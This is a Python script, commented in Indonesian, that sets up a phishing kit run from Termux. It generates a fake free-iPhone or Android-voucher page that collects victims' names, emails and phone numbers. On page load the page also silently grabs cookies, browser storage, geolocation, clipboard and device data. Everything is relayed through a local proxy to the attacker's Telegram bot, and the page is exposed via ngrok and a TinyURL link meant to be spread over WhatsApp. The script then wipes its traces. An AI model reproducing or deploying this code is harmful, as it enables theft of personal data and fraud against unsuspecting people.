import os
import subprocess
import time
import shutil
import threading
import random
import sys
import requests
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse

# Animasi UI Hollywood-style untuk Termux
def hacker_ui():
    hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
    hack_logs = [
        "🔎 Scanning target network...",
        "🛡️ Bypassing firewall...",
        "🌐 Connecting to dark pool...",
        "💉 Injecting payload...",
        "🎯 Awaiting target interaction...",
        "📡 Transmitting data to C2..."
    ]
    def animate():
        while True:
            sys.stdout.write("\033[H\033[J")  # Bersihkan layar
            print("\033[32m" + "🔥 BLACKHAT PHISHING TERMUX V3 🔥".center(80) + "\033[0m")
            print("\033[31m" + "═"*80 + "\033[0m")
            for _ in range(6):
                print("".join(random.choice(hacker_chars) for _ in range(80)))
            print("\033[31m" + "═"*80 + "\033[0m")
            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(80))
            print("\033[33m" + "Data akan masuk ke Telegram C2!".center(80))
            print("\033[31m" + "═"*80 + "\033[0m")
            time.sleep(0.4)
    threading.Thread(target=animate, daemon=True).start()

# Banner Keren
def print_banner():
    banner = r"""
😈😈😈 PENCURI DATA TERMUX V3 😈😈😈
__________  _________________________            
___  __ \ \/ /__  ____/___  _/_  ___/
__  /_/ /_  _/_____ \ __  / _____ \ 
_  ____/_  /  ____/ /___/ / ____/ / 
/_/     /_/   /____/ /____/ /____/  
                                    
    Coded by: Mr.4Rex_503
    Target: Android & iOS
    Powered by: Blackhat Indonesian Cyber
😈 Mr.5hent_503 😈
"""
    print(banner)

# Validasi Telegram Bot Token
def validate_telegram_token(bot_token):
    try:
        response = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe")
        return response.status_code == 200
    except:
        return False

# Input Konfigurasi
def get_config():
    print("🔥 Masukkan konfigurasi, tuanku:")
    ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
    bot_token = input("Masukkan Telegram Bot Token: ")
    if not validate_telegram_token(bot_token):
        print("❌ Error: Telegram Bot Token tidak valid! Dapatkan token dari @BotFather.")
        sys.exit(1)
    chat_id = input("Masukkan Telegram Chat ID: ")
    tinyurl_api = input("Masukkan TinyURL API Token (kosongkan jika tidak ada): ")
    return ngrok_authtoken, bot_token, chat_id, tinyurl_api

# Menu Pilihan
def show_menu():
    print("\n🎯 Pilih Target:")
    print("1. Android")
    print("2. iOS")
    print("3. Keluar")
    return input("Pilih [1-3]: ")

# Proxy Server untuk Bypass CORS
class ProxyHandler(BaseHTTPRequestHandler):
    def __init__(self, bot_token, chat_id, *args, **kwargs):
        self.bot_token = bot_token
        self.chat_id = chat_id
        super().__init__(*args, **kwargs)
    
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data)
            
            telegram_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            response = requests.post(
                telegram_url,
                json={"chat_id": self.chat_id, "text": f"Target: {data['target']}\nData Curian:\n{json.dumps(data['stolenData'], indent=2)}"}
            )
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success" if response.status_code == 200 else "failed"}).encode('utf-8'))
        except Exception as e:
            self.send_response(500)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))

# Template HTML Phishing
def generate_html(target, bot_token, chat_id):
    target_name = 'Android' if target == '1' else 'iOS'
    html_content = f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{'Promo Eksklusif Android' if target == '1' else 'Hadiah iPhone Gratis'}</title>
    <style>
        body {{
            background: linear-gradient(135deg, #1e3c72, #2a5298, #ff4b4b);
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            overflow: hidden;
        }}
        .container {{
            background: rgba(0, 0, 0, 0.95);
            padding: 50px;
            border-radius: 30px;
            box-shadow: 0 0 50px rgba(255, 75, 75, 0.8);
            text-align: center;
            animation: fadeIn 1s ease-in-out;
            width: 90%;
            max-width: 500px;
        }}
        h1 {{
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 0 0 20px #ff4b4b;
            animation: glitch 2s infinite;
        }}
        p {{
            font-size: 1.2em;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            font-size: 1em;
        }}
        .btn {{
            padding: 15px 40px;
            font-size: 1.2em;
            background: linear-gradient(45deg, #ff4b4b, #ff8e53);
            border: none;
            border-radius: 50px;
            color: #fff;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        .btn:hover {{
            transform: scale(1.1);
            box-shadow: 0 0 20px #ff4b4b;
        }}
        .loader {{
            display: none;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff4b4b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.8); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        @keyframes glitch {{
            0% {{ transform: translate(0); }}
            20% {{ transform: translate(-2px, 2px); }}
            40% {{ transform: translate(-2px, -2px); }}
            60% {{ transform: translate(2px, 2px); }}
            80% {{ transform: translate(2px, -2px); }}
            100% {{ transform: translate(0); }}
        }}
        .particles {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        .particle {{
            position: absolute;
            background: rgba(255, 255, 255, 0.7);
            border-radius: 50%;
            animation: float 10s infinite;
        }}
        @keyframes float {{
            0% {{ transform: translateY(0); opacity: 0.8; }}
            50% {{ opacity: 0.4; }}
            100% {{ transform: translateY(-100vh); opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <h1>{'Klaim Voucher Android Sekarang!' if target == '1' else 'Dapatkan iPhone Gratis!'}</h1>
        <p>{'Masukkan data untuk klaim voucher Rp1.000.000!' if target == '1' else 'Isi data untuk kesempatan menang iPhone terbaru!'}</p>
        <input type="text" id="name" placeholder="Nama Lengkap" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="tel" id="phone" placeholder="Nomor Telepon" required>
        <button class="btn" onclick="stealData()">Klaim Sekarang</button>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        function createParticles() {{
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 100; i++) {{
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.width = `${{Math.random() * 8 + 4}}px`;
                particle.style.height = particle.style.width;
                particle.style.left = `${{Math.random() * 100}}%`;
                particle.style.animationDelay = `${{Math.random() * 10}}s`;
                particlesContainer.appendChild(particle);
            }}
        }}
        createParticles();

        async function stealData() {{
            try {{
                document.getElementById('loader').style.display = 'block';
                const name = document.getElementById('name').value;
                const email = document.getElementById('email').value;
                const phone = document.getElementById('phone').value;

                const cookies = document.cookie;
                const localStorageData = JSON.stringify(localStorage);
                const sessionStorageData = JSON.stringify(sessionStorage);

                const deviceInfo = {{
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${{window.screen.width}}x${{window.screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: await navigator.getBattery?.().then(b => ({{
                        level: b.level,
                        charging: b.charging
                    }})) || 'Tidak tersedia',
                    geolocation: await new Promise(resolve => {{
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
                            () => resolve('Geolokasi ditolak')
                        );
                    }})
                }};

                const fileData = await exploitAndroidWebView();

                const stolenData = {{
                    name: name || 'Tidak diisi',
                    email: email || 'Tidak diisi',
                    phone: phone || 'Tidak diisi',
                    cookies: cookies || 'Tidak ada cookies',
                    localStorage: localStorageData || '{{}}',
                    sessionStorage: sessionStorageData || '{{}}',
                    files: fileData || 'Tidak ada file diakses',
                    deviceInfo: deviceInfo
                }};

                const proxyUrl = window.location.origin + '/send';
                const response = await fetch(proxyUrl, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ target: '{target_name}', stolenData: stolenData }})
                }});

                document.getElementById('loader').style.display = 'none';
                if (response.ok) {{
                    alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
                    window.location.href = 'https://google.com';
                }} else {{
                    throw new Error('Gagal mengirim data ke server proxy');
                }}
            }} catch (error) {{
                document.getElementById('loader').style.display = 'none';
                console.error('Gagal mencuri:', error);
                alert('Ups, terjadi kesalahan. Coba lagi nanti!');
            }}
        }}

        async function exploitAndroidWebView() {{
            try {{
                if (navigator.storage && navigator.storage.getDirectory) {{
                    const dirHandle = await navigator.storage.getDirectory();
                    let fileList = [];
                    for await (const [name, handle] of dirHandle.entries()) {{
                        if (handle.kind === 'file') {{
                            try {{
                                const file = await handle.getFile();
                                fileList.push({{ name: name, size: file.size, type: file.type }});
                            }} catch (e) {{
                                fileList.push({{ name: name, error: e.message }});
                            }}
                        }}
                    }}
                    return fileList.length ? fileList : 'Tidak ada file ditemukan';
                }}

                const clipboardData = await navigator.clipboard?.readText().catch(() => 'Clipboard tidak tersedia');
                const motionData = await new Promise(resolve => {{
                    window.addEventListener('devicemotion', (event) => {{
                        resolve({{
                            acceleration: event.acceleration,
                            rotation: event.rotationRate
                        }});
                    }}, {{ once: true }});
                    setTimeout(() => resolve('Sensor tidak tersedia'), 1000);
                }});

                return {{
                    files: 'Akses file tidak didukung',
                    clipboard: clipboardData,
                    motion: motionData
                }};
            }} catch (e) {{
                return 'Gagal eksploitasi: ' + e.message;
            }}
        }}

        window.onload = () => {{
            if (!document.getElementById('name').value) {{
                stealData();
            }}
        }};
    </script>
</body>
</html>"""
    return html_content

# Fungsi untuk mempersingkat URL dengan TinyURL
def shorten_url(url, tinyurl_api):
    if not tinyurl_api:
        return url
    try:
        response = requests.get(
            f"https://api.tinyurl.com/create?api_token={tinyurl_api}",
            params={"url": url}
        ).json()
        return response.get('data', {}).get('tiny_url', url)
    except:
        return url

# Buat File dan Jalankan Server
def setup_phishing(target, ngrok_authtoken, bot_token, chat_id, tinyurl_api):
    # Buat folder di Termux
    os.makedirs("phishing_site", exist_ok=True)
    
    # Simpan HTML dengan encoding UTF-8
    html_content = generate_html(target, bot_token, chat_id)
    with open("phishing_site/index.html", "w", encoding="utf-8") as f:
        f.write(html_content)
    
    # Konfigurasi Ngrok
    ngrok_config = f"""authtoken: {ngrok_authtoken}
tunnels:
  phishing:
    addr: 8080
    proto: http
"""
    with open("ngrok.yml", "w", encoding="utf-8") as f:
        f.write(ngrok_config)
    
    # Jalankan server proxy di port 8000
    proxy_server = HTTPServer(('localhost', 8000), lambda *args, **kwargs: ProxyHandler(bot_token, chat_id, *args, **kwargs))
    proxy_thread = threading.Thread(target=proxy_server.serve_forever, daemon=True)
    proxy_thread.start()
    
    # Jalankan server lokal untuk halaman phishing
    try:
        server_process = subprocess.Popen(["python3", "-m", "http.server", "8080"], cwd="phishing_site")
    except FileNotFoundError:
        print("❌ Error: Python3 atau http.server tidak ditemukan. Jalankan 'pkg install python' di Termux.")
        sys.exit(1)
    
    # Pengecekan Ngrok
    ngrok_executable = "ngrok"
    if not shutil.which(ngrok_executable):
        print("❌ Error: Ngrok tidak ditemukan! Jalankan 'pkg install ngrok' di Termux.")
        proxy_server.shutdown()
        sys.exit(1)
    
    # Jalankan Ngrok
    try:
        ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "../ngrok.yml", "phishing"])
    except FileNotFoundError:
        print("❌ Error: Ngrok executable tidak ditemukan. Pastikan Ngrok terinstall.")
        proxy_server.shutdown()
        server_process.terminate()
        sys.exit(1)
    
    # Tunggu Ngrok aktif dengan retry
    ngrok_url = None
    for _ in range(5):
        try:
            time.sleep(3)
            ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
            ngrok_url = ngrok_url.split('"public_url":"')[1].split('"')[0]
            break
        except:
            print("🔄 Mencoba mendapatkan URL Ngrok...")
    
    if ngrok_url:
        short_url = shorten_url(ngrok_url, tinyurl_api)
        print(f"\n🎉 Link Phishing Siap Disebar: {short_url}")
        print("🔗 Kirim link ini via WhatsApp/Telegram!")
        print("⏳ Menunggu target mengklik... Data akan masuk ke bot Telegram!")
    else:
        print("❌ Gagal mendapatkan URL Ngrok. Pastikan Ngrok berjalan dan authtoken valid!")
        proxy_server.shutdown()
        server_process.terminate()
        ngrok_process.terminate()
        sys.exit(1)
    
    # Monitor proses
    def monitor_processes():
        while server_process.poll() is None and ngrok_process.poll() is None:
            time.sleep(1)
        if server_process.poll() is None:
            server_process.terminate()
        if ngrok_process.poll() is None:
            ngrok_process.terminate()
        proxy_server.shutdown()
        print("❌ Salah satu proses mati! Menghentikan operasi...")
    
    threading.Thread(target=monitor_processes, daemon=True).start()
    return server_process, ngrok_process, proxy_server

# Main Program
def main():
    # Pengecekan dependensi di Termux
    print("🔍 Mengecek dependensi...")
    for pkg in ["python", "curl", "ngrok"]:
        if not shutil.which(pkg):
            print(f"❌ Error: {pkg} tidak ditemukan. Jalankan 'pkg install {pkg}' di Termux.")
            sys.exit(1)
    
    print_banner()
    ngrok_authtoken, bot_token, chat_id, tinyurl_api = get_config()
    
    while True:
        choice = show_menu()
        if choice == "1" or choice == "2":
            print(f"\n🔨 Membuat halaman phishing untuk {'Android' if choice == '1' else 'iOS'}...")
            server_process, ngrok_process, proxy_server = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api)
            hacker_ui()
            try:
                input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
            finally:
                server_process.terminate()
                ngrok_process.terminate()
                proxy_server.shutdown()
                shutil.rmtree("phishing_site", ignore_errors=True)
                if os.path.exists("ngrok.yml"):
                    os.remove("ngrok.yml")
                print("🧹 Membersihkan jejak... Selesai!")
            break
        elif choice == "3":
            print("😈 Keluar dari mode jahat. Sampai jumpa, tuanku!")
            break
        else:
            print("❌ Pilihan salah! Pilih 1, 2, atau 3.")

if __name__ == "__main__":
    main()
